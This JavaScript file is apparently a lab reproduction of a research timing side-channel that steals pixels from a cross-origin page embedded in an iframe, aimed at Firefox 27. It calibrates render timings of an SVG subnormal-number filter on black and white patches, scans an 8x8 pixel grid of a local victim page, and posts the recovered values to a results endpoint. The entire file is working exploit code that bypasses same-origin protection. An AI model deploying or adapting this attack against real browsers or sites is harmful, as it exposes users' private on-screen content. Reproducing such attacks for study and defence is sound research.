// only functions and stuff that are supported Firefox 27

function $(id) { return document.getElementById(id); }

var busy = false;
var stopped = false;
var loaded = false;
var calibrated = false;   // true once the calibrated test found a usable gap
var threshold = null;     // midpoint between calibrated black/white means
var subnormalFilter = 'url(#subnormalFilter)';

var results = {
  runId: (typeof fixtureRunId !== 'undefined') ? fixtureRunId : null,
  userAgent: navigator.userAgent,
  startedAt: new Date().toISOString(),
  calibration: null,  // {area, blackMean, whiteMean, threshold, blackTimings, whiteTimings}
  scan: []            // [{x, y, area, timings: [...], mean, guess}]
};

// Build the 64-cell grid UI
var cells = [];
(function buildGrid() {
  var i;
  for (i = 0; i < 64; i++) {
    var cell = document.createElement('span');
    cell.textContent = '?';
    $('grid').appendChild(cell);
    cells.push(cell);
  }
})();

// Average of an array of numbers
function mean(values) {
  var sum = 0, i;
  for (i = 0; i < values.length; i++) sum += values[i];
  return sum / values.length;
}

// Reads the current Area/Samples form values
function settings() {
  return { area: Number($('area').value), samples: Number($('samples').value) };
}

function clamp(value, lo, hi) { return Math.max(lo, Math.min(hi, value)); }

// Pixel isolation + enlargement (the paper's step 1): 
// positions cross-origin iframe so the chosen (x, y) pixel sits in the 1x1 clip window, 
// then scales that clipped view up to the enlarged inspection area
function selectPixel() {
  ['x', 'y'].forEach(function (axis) {
    $(axis).value = clamp(Math.floor(Number($(axis).value) || 0), 0, 7);
  });
  var x = Number($('x').value), y = Number($('y').value);
  $('victim').style.left = (-x) + 'px';
  $('victim').style.top = (-y) + 'px';
  cells.forEach(function (cell, i) {
    if (i === y * 8 + x) cell.classList.add('selected');
    else cell.classList.remove('selected');
  });
  var area = settings().area;
  $('pixel').style.transform = 'scale(' + area + ')';
  $('inspection').style.width = $('inspection').style.height = area + 'px';
}

// Enables/disables buttons based on current state (busy, loaded, calibrated)
function controls() {
  ['x', 'y', 'area', 'samples'].forEach(function (id) { $(id).disabled = busy; });
  $('scan').disabled = busy || !loaded || !calibrated;
  $('calibrate').disabled = busy || !loaded;
  $('stop').disabled = !busy;
  $('exportBtn').disabled = busy || (!results.calibration && results.scan.length === 0);
}

// Loads the victim into the iframe and resets the UI for another run
function loadVictim() {
  loaded = false;
  controls();
  $('boundary').textContent = 'Loading victim…';
  $('victim').src = 'http://127.0.0.1:8001/';
  cells.forEach(function (cell) {
    cell.textContent = '?';
    cell.className = '';
  });
  $('status').textContent = 'Not calibrated. Run the calibration before scanning.';
}

// Cross-origin check: once the victim signals it's ready, try to read its DOM. 
// Need to fail #sanitycheck
window.addEventListener('message', function (event) {
  var origin = 'http://127.0.0.1:8001';
  if (event.source !== $('victim').contentWindow || event.origin !== origin || event.data !== 'fixture-ready') return;
  var readable = false;
  try { readable = Boolean($('victim').contentWindow.document.querySelector('svg')); }
  catch (error) {
  }
  loaded = !readable;
  $('boundary').textContent = 'Cross-origin check: DOM ' + (readable ? 'unexpectedly readable — stopped' : 'access blocked, as expected') + '.';
  selectPixel();
  controls();
});

// Paper's steps 2 + timing): Elapsed time is how long that filtered render took
function sampleFiltered(el, done) {
  if (stopped || document.hidden) { done(new Error('Stopped.')); return; }
  el.style.filter = '';
  requestAnimationFrame(function () {
    if (stopped || document.hidden) { done(new Error('Stopped.')); return; }
    el.style.filter = subnormalFilter;
    var start = performance.now();
    requestAnimationFrame(function () {
      el.style.filter = '';
      if (stopped || document.hidden) { done(new Error('Stopped.')); return; }
      done(null, performance.now() - start);
    });
  });
}

function timesSeries(n, iterFn, done) {
  var out = [];
  var i = 0;
  function step() {
    if (stopped || document.hidden) { done(new Error('Stopped.')); return; }
    if (i >= n) { done(null, out); return; }
    var idx = i++;
    iterFn(idx, function (err, value) {
      if (err) { done(err); return; }
      out.push(value);
      step();
    });
  }
  step();
}

function warmUp(done) {
  timesSeries(5, function (i, cb) { sampleFiltered($('inspection'), cb); }, function (err) { done(err); });
}

// Calibration: time known black and white with the subnormal filter, and use the midpoint of their 
// average times as the black/white threshold.
function runCalibration(done) {
  var count = settings().samples;
  var area = settings().area;
  $('patch').style.display = 'block';
  var colors = { black: [], white: [] };
  var order = [];
  var i;
  for (i = 0; i < count; i++) { order.push(i % 2 ? ['white', 'black'] : ['black', 'white']); }
  var sequence = [];
  order.forEach(function (pair) { sequence = sequence.concat(pair); });

  timesSeries(sequence.length, function (i, cb) {
    var color = sequence[i];
    $('patch').style.background = color;
    $('status').textContent = 'Calibration: timing ' + color + ' patch (' + (i + 1) + '/' + sequence.length + ')…';
    sampleFiltered($('patch'), function (err, ms) {
      if (err) { cb(err); return; }
      colors[color].push(ms);
      cb(null, ms);
    });
  }, function (err) {
    $('patch').style.display = 'none';
    if (err) { done(err); return; }
    var blackMean = mean(colors.black);
    var whiteMean = mean(colors.white);
    var computedThreshold = (blackMean + whiteMean) / 2;
    var delta = Math.abs(whiteMean - blackMean);
    results.calibration = {
      area: area,
      samples: count,
      blackMean: blackMean,
      whiteMean: whiteMean,
      delta: delta,
      threshold: computedThreshold,
      blackTimings: colors.black,
      whiteTimings: colors.white
    };

    var MIN_USABLE_DELTA_MS = 2;
    if (delta < MIN_USABLE_DELTA_MS) {
      calibrated = false;
      threshold = null;
      $('summary').textContent = 'Calibration: black ' + blackMean.toFixed(2) + ' ms; white ' + whiteMean.toFixed(2) +
        ' ms; delta ' + delta.toFixed(2) + ' ms — too small to trust. Try a larger area, or confirm this build/CPU is actually vulnerable.';
      done(null);
      return;
    }
    calibrated = true;
    threshold = computedThreshold;
    $('summary').textContent = 'Calibration OK: black ' + blackMean.toFixed(2) + ' ms; white ' + whiteMean.toFixed(2) +
      ' ms; threshold ' + threshold.toFixed(2) + ' ms. Scan unlocked.';
    done(null);
  });
}

// The actual pixel-stealing scan: for each of the victim pixels, isolate + enlarge it, time it with the subnormal filter,
// and classify it as black/white by comparing against the calibrated threshold -> recovers a pixel value
function runScan(done) {
  if (!calibrated || threshold === null) { done(new Error('Run the self-test first.')); return; }
  var count = settings().samples;
  var area = settings().area;
  cells.forEach(function (cell) { cell.textContent = '?'; cell.className = ''; });
  results.scan = [];

  timesSeries(64, function (i, cbPixel) {
    $('x').value = i % 8;
    $('y').value = Math.floor(i / 8);
    selectPixel();
    $('status').textContent = 'Scanning pixel ' + (i + 1) + '/64…';
    timesSeries(count, function (j, cbSample) { sampleFiltered($('inspection'), cbSample); }, function (err, timings) {
      if (err) { cbPixel(err); return; }
      var pixelMean = mean(timings);
      var guess = pixelMean > threshold ? 'white' : 'black';
      results.scan.push({
        x: i % 8, y: Math.floor(i / 8), area: area,
        timings: timings, mean: pixelMean, guess: guess
      });
      cells[i].classList.add('sampled');
      cells[i].classList.add(guess === 'black' ? 'black-guess' : 'white-guess');
      cells[i].textContent = guess === 'black' ? 'B' : 'W';
      cbPixel(null);
    });
  }, function (err) {
    if (err) { done(err); return; }
    var means = results.scan.map(function (p) { return p.mean; });
    $('summary').textContent = results.scan.length + ' pixels scanned; mean render time ' + mean(means).toFixed(2) +
      ' ms.';
    done(null);
  });
}

function postResults() {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', '/results', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(results));
  } catch (error) { }
}

function refreshExport() {
  var json = JSON.stringify(results, null, 2);
  $('resultsJson').value = json;
  return json;
}

$('exportBtn').onclick = function () {
  var json = refreshExport();
  try {
    var blob = new Blob([json], { type: 'application/json' });
    var url = URL.createObjectURL(blob);
    var a = document.createElement('a');
    a.href = url;
    a.download = 'results-' + Date.now() + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(function () { URL.revokeObjectURL(url); }, 1000);
  } catch (error) {
  }
};


function run(kind) {
  if (busy || !loaded) return;
  var count = settings().samples;
  if (!(count >= 1 && count <= 100 && Math.floor(count) === count)) {
    $('status').textContent = 'Choose 1–100 samples per pixel.';
    return;
  }
  var rect = $('inspection').getBoundingClientRect();
  if (rect.top < 0 || rect.left < 0 || rect.bottom > innerHeight || rect.right > innerWidth) {
    $('status').textContent = 'Move the entire inspection area into view before measuring.';
    return;
  }
  busy = true;
  stopped = false;
  controls();
  $('status').textContent = 'Warming up…';
  warmUp(function (err) {
    if (err) { finish(err); return; }
    if (kind === 'baseline') {
      runCalibration(finish);
    } else {
      runScan(finish);
    }
  });

  function finish(err) {
    $('status').textContent = err ? err.message : 'Done. See the summary panel below.';
    $('patch').style.display = 'none';
    busy = false;
    controls();
    refreshExport();
    postResults();
  }
}

['x', 'y', 'area'].forEach(function (id) { $(id).onchange = selectPixel; });
$('calibrate').onclick = function () { run('baseline'); };
$('scan').onclick = function () { run('scan'); };
$('stop').onclick = function () { stopped = true; };
document.addEventListener('visibilitychange', function () { if (document.hidden) stopped = true; });
loadVictim();
